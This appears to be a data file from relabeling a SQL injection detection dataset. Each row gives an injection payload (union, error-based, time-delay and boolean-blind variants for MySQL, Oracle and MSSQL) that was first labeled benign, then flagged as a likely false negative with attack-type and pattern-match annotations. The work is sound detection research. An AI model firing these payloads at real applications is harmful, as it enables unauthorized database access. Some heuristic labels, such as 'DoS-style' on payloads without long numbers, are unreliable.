"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""xyjg"" = ""xyjg",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'xmltype' (likely false negative),error_based,oracle,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""xyjg"" = ""xyjg",False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,oracle,1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',False,0,time_blind,oracle,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'waitfor delay' detected
"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) as yuqv where 6007 = 6007 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1' ) as yuqv where 6007 = 6007 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
-6109 union all select 6784--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,-6109 union all select 6784--,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' in boolean mode ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),error_based,mysql,"1' in boolean mode ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) #",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1,extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1,extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""gcyp"" like ""gcyp",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""gcyp"" like ""gcyp",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1' ) ) union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' ) ) union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) as boeh where 2571 = 2571 union all select null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) as boeh where 2571 = 2571 union all select null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) union all select null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' ) union all select null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
